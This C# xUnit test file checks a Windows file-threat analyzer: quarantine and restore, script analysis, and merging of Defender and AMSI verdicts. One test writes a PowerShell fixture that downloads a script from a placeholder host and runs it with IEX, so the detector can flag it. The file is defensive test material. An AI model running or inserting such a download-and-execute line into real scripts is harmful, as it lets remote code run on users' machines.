using System;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using Bakım.Core.Analyzer;
using Bakım.Models;
using Bakım.Services;
using Bakım.Services.Analyzer;
using Xunit;

namespace Bakim.Tests;

/// <summary>Analizör v3 Faz 3 (Windows): karantina, betik analizi, ikinci görüş birleştirmesi. Ağa ve Defender'a çıkmaz.</summary>
public sealed class AnalyzerFaz3WindowsTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "bakim-faz3-" + Guid.NewGuid().ToString("N"));

    public AnalyzerFaz3WindowsTests() => Directory.CreateDirectory(_dir);

    public void Dispose()
    {
        try { Directory.Delete(_dir, recursive: true); }
        catch (IOException) { }
        catch (UnauthorizedAccessException) { }
    }

    private sealed class FakeSecondOpinion : ISecondOpinionService
    {
        public DefenderScanResult Defender { get; init; } = DefenderScanResult.Unavailable("test");
        public bool? Amsi { get; init; } = false;
        public bool? IsDefenderActive() => Defender.State != DefenderScanState.Unavailable;
        public Task<DefenderScanResult> ScanFileWithDefenderAsync(string path, CancellationToken ct = default) => Task.FromResult(Defender);
        public bool? ScanContentWithAmsi(string content, string contentName) => Amsi;
    }

    private sealed class NoVirusTotal : IVirusTotalCheckService
    {
        public string ApiKey { get; set; } = string.Empty;
        public bool HasApiKey => false;
        public string ComputeSha256(string filePath) => string.Empty;
        public Task<(int malicious, int total, string message)> CheckHashAsync(string sha256Hash, string? apiKey = null) => Task.FromResult((-1, -1, "API Anahtarı Gerekli"));
        public int LastSuspicious(string sha256) => 0;
        public bool IsCached(string sha256) => true;
        public TimeSpan EstimateWait(int pendingRequests) => TimeSpan.Zero;
        public Task<bool> ValidateApiKeyAsync(string apiKey) => Task.FromResult(false);
        public Task<VirusTotalUploadResult> UploadFileAsync(string filePath, IProgress<string>? progress = null) => Task.FromResult(new VirusTotalUploadResult());
        public void OpenInBrowser(string sha256OrUrl) { }
        public void OpenUploadPage(string filePath) { }
        public void SmartOpenInBrowser(string filePath, string sha256Hash, int totalDetections) { }
        public void SaveApiKey(string apiKey) { }
        public string LoadApiKey() => string.Empty;
    }

    private static bool HasExecuteDeny(string path) =>
        new FileInfo(path).GetAccessControl().GetAccessRules(true, false, typeof(SecurityIdentifier)).Cast<FileSystemAccessRule>()
            .Any(r => r.AccessControlType == AccessControlType.Deny && r.FileSystemRights.HasFlag(FileSystemRights.ExecuteFile));

    [Fact]
    public async Task Quarantine_MovesFile_DeniesExecute_AndRestores()
    {
        string file = Path.Combine(_dir, "suspect.exe");
        File.WriteAllBytes(file, new byte[] { (byte)'M', (byte)'Z', 1, 2, 3 });
        var service = new QuarantineService(activity: null, root: Path.Combine(_dir, "q"));

        var outcome = await service.QuarantineAsync(file, "test");
        Assert.True(outcome.Success, outcome.Message);
        Assert.False(File.Exists(file));
        string qdir = Path.Combine(_dir, "q", outcome.Manifest!.Id);
        string stored = Path.Combine(qdir, outcome.Manifest.StoredFileName);
        Assert.True(File.Exists(stored));
        Assert.True(HasExecuteDeny(stored));
        Assert.NotNull(outcome.Manifest.Sha256);

        var restored = await service.RestoreAsync(qdir);
        Assert.True(restored.Success, restored.Message);
        Assert.True(File.Exists(file));
        Assert.False(HasExecuteDeny(file));
        Assert.False(Directory.Exists(qdir));
    }

    [Fact]
    public async Task Quarantine_RefusesProtectedLocations_AndKeepsRestoreSafe()
    {
        var service = new QuarantineService(activity: null, root: Path.Combine(_dir, "q"));
        string explorer = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");
        var blocked = await service.QuarantineAsync(explorer, "test");
        Assert.False(blocked.Success);
        Assert.True(File.Exists(explorer));

        // Özgün konumda yeni bir dosya varsa geri yükleme üzerine yazmaz.
        string file = Path.Combine(_dir, "a.exe");
        File.WriteAllText(file, "x");
        var outcome = await service.QuarantineAsync(file, "test");
        File.WriteAllText(file, "yeni");
        var restored = await service.RestoreAsync(Path.Combine(_dir, "q", outcome.Manifest!.Id));
        Assert.False(restored.Success);
        Assert.Equal("yeni", File.ReadAllText(file));
    }

    [Fact]
    public async Task DeepAnalysis_ScriptContent_AndAmsi()
    {
        string dropper = Path.Combine(_dir, "update.ps1");
        File.WriteAllText(dropper, "$c = (New-Object Net.WebClient).DownloadString('http://x.example/a')\r\nIEX $c\r\n");
        var analyzer = new FileThreatAnalyzerService(new NoVirusTotal(), new FakeSecondOpinion());
        var result = await analyzer.AnalyzeFileAsync(dropper);
        Assert.Contains(result.Factors, f => f.Title == "İndir ve çalıştır");
        Assert.True(result.RiskScore >= 50, $"Puan {result.RiskScore}");

        string benign = Path.Combine(_dir, "install.ps1");
        File.WriteAllText(benign, "Copy-Item .\\app.exe $env:ProgramFiles\\App\r\nWrite-Host 'Tamam'\r\n");
        var clean = await analyzer.AnalyzeFileAsync(benign);
        Assert.DoesNotContain(clean.Factors, f => f.Title == "İndir ve çalıştır");

        var amsi = await new FileThreatAnalyzerService(new NoVirusTotal(), new FakeSecondOpinion { Amsi = true }).AnalyzeFileAsync(benign);
        Assert.True(amsi.RiskScore >= 90);
        Assert.Contains(amsi.Factors, f => f.Title.Contains("AMSI"));
    }

    [Fact]
    public async Task DefenderOpinion_Threat_RaisesScore_Unavailable_DoesNot()
    {
        string file = Path.Combine(_dir, "tool.exe");
        File.WriteAllBytes(file, new byte[] { (byte)'M', (byte)'Z' });

        var unavailable = new FileThreatAnalyzerService(new NoVirusTotal(), new FakeSecondOpinion());
        var r1 = await unavailable.AnalyzeFileAsync(file);
        int before = r1.RiskScore;
        await unavailable.ApplyDefenderOpinionAsync(r1);
        Assert.Equal(before, r1.RiskScore);
        Assert.Equal(DefenderScanState.Unavailable, r1.DefenderState);

        var threat = new FileThreatAnalyzerService(new NoVirusTotal(),
            new FakeSecondOpinion { Defender = new DefenderScanResult(DefenderScanState.ThreatFound, new[] { "Trojan:Win32/Test" }, "x") });
        var r2 = await threat.AnalyzeFileAsync(file);
        await threat.ApplyDefenderOpinionAsync(r2);
        Assert.True(r2.RiskScore >= 90);
        Assert.Contains("Trojan:Win32/Test", r2.DefenderSummary);
        Assert.StartsWith("YÜKSEK RİSK", r2.Recommendation);
        Assert.Contains("karantina", r2.Recommendation);
    }
}
